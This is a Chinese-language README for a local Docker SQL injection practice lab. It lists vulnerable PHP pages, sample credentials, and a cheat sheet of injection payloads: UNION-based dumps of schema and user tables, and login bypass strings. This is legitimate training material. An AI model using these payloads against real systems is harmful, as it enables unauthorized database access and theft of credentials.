# SQL 注入基础

## 环境信息
- 访问地址: `http://localhost:8080`
- MySQL 容器: `sqli-mysql` (root/root, database: test)
- PHP 容器: `sqli-php`

## 启动/停止
```bash
docker compose up -d --build   # 启动
docker compose down             # 停止
```

## 练习页面

| 页面 | 注入类型 | 参数 |
|------|----------|------|
| sql1.php | 数字型 | `?id=1` |
| sql2.php | 字符型 | `?id=1' OR '1'='1` |
| login.php | POST 登录绕过 | `username=admin&password=' OR 1=1 -- ` |
| search.php | LIKE 查询 | `?q=新闻` |
| union.php | UNION 联合查询 | `?id=1` |

## 常用 Payload

### 数字型
```sql
-- 判断列数
?id=1 ORDER BY 2
-- 联合查询
?id=-1 UNION SELECT 1,2
-- 爆数据库
?id=-1 UNION SELECT database(),user()
-- 爆表名
?id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
-- 爆字段
?id=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'
-- 爆数据
?id=-1 UNION SELECT username,password FROM users
```

### 字符型
```sql
?id=1' OR '1'='1
?id=1' UNION SELECT 1,2 -- 
```

### 登录绕过
```sql
username=admin&password=' OR '1'='1
username=admin&password=' OR 1=1 --
```

### LIKE 查询
```sql
?q=' UNION SELECT 1,2 -- 
```

## 数据库结构
- **wp_news**: id, title, content
- **users**: id, username, password
  - admin / supersecret123
  - guest / guest123
  - test / test456
